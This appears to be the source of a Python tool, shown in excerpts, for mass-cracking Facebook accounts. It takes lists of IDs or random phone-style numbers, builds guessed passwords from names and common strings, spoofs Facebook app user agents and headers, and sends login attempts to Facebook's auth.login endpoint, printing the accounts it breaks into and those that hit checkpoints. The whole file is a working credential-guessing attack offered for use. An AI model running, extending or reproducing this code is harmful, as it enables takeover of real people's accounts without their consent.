...
#os.system("xdg-open https://wa.me/+923333607909")
...
def faraz():
    ...
    #print(f" [+] Key :",f_token,"")
    print(64*"-")
    print(f" [1]\033[;37m File Clone ")
    print(f" [2] Random Clone  ")
    print(f" [3] Owner Whatsapp ")
    print(f" [4] Owner Facebook  ")
    print(f" [0] Exit")
    ...
    if faraz in ["1", "01","11","A","a"]:
        clear()
        file = input(f' Put File Name\033[1;37m: ')
        try:
        ...
        plist=[]
        try:
            ps_limit = int(input(f'\033[;37mHow many passwords do you want to add ? '))
            print(64*"-")
        except:
            ps_limit =1
...
def api(ids,names,passlist): 
                ...
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [FARAZ1x1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
...
def api1(ids,names,passlist):
                ...
                for pas in passlist:
                                ...
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_strint = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
                                ua_string = "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build/R16NW) [FBAN/FB4A;FBAV/187.0.0.43.81;FBPN/com.facebook.katana;FBLC/fr_FR;FBBV/122388438;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,h"
                                ua_string = "[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                ...
                                head = {
                                        ...
                                        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/332.2.0.42.70;FBBV/483985217;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
...
#_________[ USER-AGENT LIST ]______>>>
ualist = [
    "[FBAN/FB4A;FBAV/55.0.0.967;FBBV/2353041;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    "Dalvik/2.1.0 (Linux; U; Android 5.0.0; SM-T677 Build/gvlte [FBAN/FB4A;FBAV/499.0.0.30333;FBBV/973327975;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/973327975;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.lite;FBDV/SM-T677;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 10.0.0; 4045O Build/alto4_8g [FBAN/FB4A;FBAV/114.0.0.46266;FBBV/13059789;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/13059789;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/4045O;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 10.0.0; H300 Build/H300 [FBAN/FB4A;FBAV/519.0.0.19122;FBBV/330461857;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/330461857;FBMF/Symphony;FBBD/Symphony;FBPN/com.facebook.adsmanager;FBDV/H300;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 6.0.0; ALCATEL ONE TOUCH 4005D Build/Beetle_Lite_Edge_GSM [FBAN/FB4A;FBAV/391.0.0.32528;FBBV/678223188;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/678223188;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/ALCATEL ONE TOUCH 4005D;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; SCH-R730 Build/SCH-R730 [FBAN/FB4A;FBAV/458.0.0.37446;FBBV/258881394;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/258881394;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/SCH-R730;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 8.0.0; ALCATEL ONE TOUCH 7024N Build/Rav4 [FBAN/FB4A;FBAV/490.0.0.22417;FBBV/235110254;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/235110254;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/ALCATEL ONE TOUCH 7024N;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 13.0.0; 6039A Build/idol347 [FBAN/FB4A;FBAV/277.0.0.47319;FBBV/500281175;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/500281175;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.katana;FBDV/6039A;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 11.0.0; GT-S5303 Build/coriplusds [FBAN/FB4A;FBAV/365.0.0.38168;FBBV/41319369;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/41319369;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.lite;FBDV/GT-S5303;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 12.0.0; ZTE Q7 Build/P839V50 [FBAN/FB4A;FBAV/133.0.0.24230;FBBV/153035543;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/153035543;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.mlite;FBDV/ZTE Q7;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 6.0.0; GT-S6818V Build/nevis3gcmcc [FBAN/FB4A;FBAV/381.0.0.20213;FBBV/569503405;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/569503405;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/GT-S6818V;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 7.0.0; ALCATEL ONE TOUCH 6010D Build/Telsa [FBAN/FB4A;FBAV/312.0.0.39547;FBBV/982717592;FBDM/{density=0.0,width=720,height=1280};FBLC/en_US;FBRV/982717592;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/ALCATEL ONE TOUCH 6010D;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 13.0.0; SM-G150NL Build/novelltelgt [FBAN/FB4A;FBAV/408.0.0.20500;FBBV/175332841;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/175332841;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G150NL;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    "Dalvik/2.1.0 (Linux; U; Android 7.0.0; SM-T116BU Build/goyave3gsea [FBAN/FB4A;FBAV/133.0.0.47286;FBBV/244331818;FBDM/{density=0.0,width=720,height=1280};FBLC/en_US;FBRV/244331818;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-T116BU;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
    ...
    "Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
    "Mozilla/5.0 (Linux; Android 10; Infinix X656 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]"
   "[FBAN/FB4A;FBAV/55.0.0.967;FBBV/2353041;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=720,height=1280};FBLC/ar_AR;FBCR/Libyana;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G7102;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    ]
...
def random_number():
    ...
    os.system("clear")
    logo()
    print(f"[{green}+{white}] Key :",f_token,"")
    print(64*"-")
    ...
    #    print(64*"-")
        print("\n Cracking Start Pleace Wait  . . . \n")
        print(64*"-")
        total = str(len(user_ID))
        for user in user_ID:
            uid = code+user
            pwx = [user,uid,"khankhan","khan khan"]
...
def bapi(uid,pwx,total):
    ...
    global cracked
    try:
        sys.stdout.write(f'\r\r[FARAZ] {len(cracked)}\{total} - OK\CP {green}{len(oks)}{white}\{rad}{len(cps)}{white}\r\r');sys.stdout.flush()
        for pw in pwx:
            ...
            urlX = 'https://b-api.facebook.com/method/auth.login'
            responce = requests.post(urlX,data=dataX,headers=headersX,allow_redirects=False).text
            responce_json = json.loads(responce)
            if 'session_key' in responce_json:
                uidX = str(responce_json['uid'])
                if uidX not in oks:
                    print(f'{green} [FARAZ-OK] {uidX} | {pw} {white}')
                    oks.append(uidX)
            elif responce_json['error_code'] == 405:
                if uid not in cps:
                    print(f'{rad} [FARAZ-CP] {uid} | {pw} {white}')
                    cps.append(uid)
            else:
                continue
        cracked.append(uid)
